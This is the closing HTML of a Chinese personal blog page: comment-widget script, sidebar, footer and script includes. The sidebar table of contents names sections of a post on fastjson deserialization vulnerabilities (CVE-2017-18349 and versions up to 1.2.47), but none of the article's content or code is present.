          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.</span> <span class="nav-text">fastjson入门学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.1.</span> <span class="nav-text">前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fastjson%E5%A6%82%E4%BD%95%E7%94%A8"><span class="nav-number">1.1.1.</span> <span class="nav-text">fastjson如何用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JNDI%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">1.1.2.</span> <span class="nav-text">JNDI是什么</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RMI%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">1.1.3.</span> <span class="nav-text">RMI是什么</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LDAP%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">1.1.4.</span> <span class="nav-text">LDAP是什么</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#java%E5%8F%8D%E5%B0%84%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-number">1.1.5.</span> <span class="nav-text">java反射是什么</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8E%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%81%94%E7%B3%BB"><span class="nav-number">1.1.5.1.</span> <span class="nav-text">与漏洞的联系</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞学习</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fastjson"><span class="nav-number">1.2.1.</span> <span class="nav-text">fastjson&lt;&#x3D;1.2.24 反序列化漏洞（CVE-2017-18349）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">漏洞分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastjson-1-2-25-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.2.</span> <span class="nav-text">fastjson 1.2.25 反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E6%9C%BA%E5%88%B6%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">黑白名单机制介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87%E7%9A%84%E5%A4%8D%E7%8E%B0%EF%BC%88jkd%E7%89%88%E6%9C%AC%E9%97%AE%E9%A2%98%E6%9C%AA%E6%88%90%E5%8A%9F%EF%BC%89"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">黑白名单绕过的复现（jkd版本问题未成功）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%B9%E4%B8%A4%E7%A7%8Dpoc%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95%E7%9A%84%E5%88%86%E6%9E%90"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">对两种poc绕过手法的分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E4%BA%8EJdbcRowSetImpl%E9%93%BE%E5%88%A9%E7%94%A8%E7%9A%84%E5%88%86%E6%9E%90"><span class="nav-number">1.2.2.4.</span> <span class="nav-text">关于JdbcRowSetImpl链利用的分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastjson-1-2-42-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.3.</span> <span class="nav-text">fastjson 1.2.42 反序列化漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastjson-1-2-43-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.4.</span> <span class="nav-text">fastjson 1.2.43 反序列化漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastjson-1-2-44-mappings%E7%BC%93%E5%AD%98%E5%AF%BC%E8%87%B4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.5.</span> <span class="nav-text">fastjson 1.2.44 mappings缓存导致反序列化漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fastjson-1-2-47-mappings%E7%BC%93%E5%AD%98%E5%AF%BC%E8%87%B4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.2.6.</span> <span class="nav-text">fastjson 1.2.47 mappings缓存导致反序列化漏洞</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="rev1ve"
      src="/images/1.jpg">
  <p class="site-author-name" itemprop="name">rev1ve</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">73</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">35</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2024-03 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">rev1ve</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>


  <script defer src="/lib/three/three.min.js"></script>


  




  
<script src="/js/local-search.js"></script>













  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : 'EbJd2uGnZROX6CGHpkKNkBAj-gzGzoHsz',
      appKey     : 'KXq3KsjxZ28WDhwbOrLlm4Yw',
      placeholder: "快来评论叭",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : 'zh-cn' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : 'https://ebjd2ugn.lc-cn-n1-shared.com'
    });
  }, window.Valine);
});
</script>

</body>
</html>
